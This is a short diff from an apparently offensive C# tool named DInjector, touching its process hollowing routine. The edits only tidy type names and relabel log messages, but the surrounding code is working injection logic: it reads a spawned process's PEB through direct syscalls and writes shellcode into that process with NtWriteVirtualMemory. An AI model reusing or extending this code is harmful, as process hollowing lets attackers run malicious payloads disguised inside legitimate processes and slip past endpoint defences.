@@ -24,13 +24,13 @@ namespace DInjector
             #region NtQueryInformationProcess
 
             IntPtr hProcess = pi.hProcess;
-            DI.Data.Native.PROCESS_BASIC_INFORMATION bi = new DI.Data.Native.PROCESS_BASIC_INFORMATION();
+            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
             uint returnLength = 0;
 
             // Query created process to extract its base address pointer from PEB (Process Environment Block)
             var ntstatus = Syscalls.NtQueryInformationProcess(
                 hProcess,
-                DI.Data.Native.PROCESSINFOCLASS.ProcessBasicInformation,
+                PROCESSINFOCLASS.ProcessBasicInformation,
                 ref bi,
                 (uint)(IntPtr.Size * 6),
                 ref returnLength);
@@ -121,7 +121,7 @@ namespace DInjector
 
             #endregion
 
-            #region NtWriteVirtualMemory
+            #region NtWriteVirtualMemory (shellcode)
 
             var buffer = Marshal.AllocHGlobal(shellcode.Length);
             Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
@@ -137,9 +137,9 @@ namespace DInjector
                 ref bytesWritten);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(ProcessHollowing) [+] NtWriteVirtualMemory");
+                Console.WriteLine("(ProcessHollowing) [+] NtWriteVirtualMemory, shellcode");
             else
-                throw new Exception($"(ProcessHollowing) [-] NtWriteVirtualMemory: {ntstatus}");
+                throw new Exception($"(ProcessHollowing) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");
 
             #endregion
 
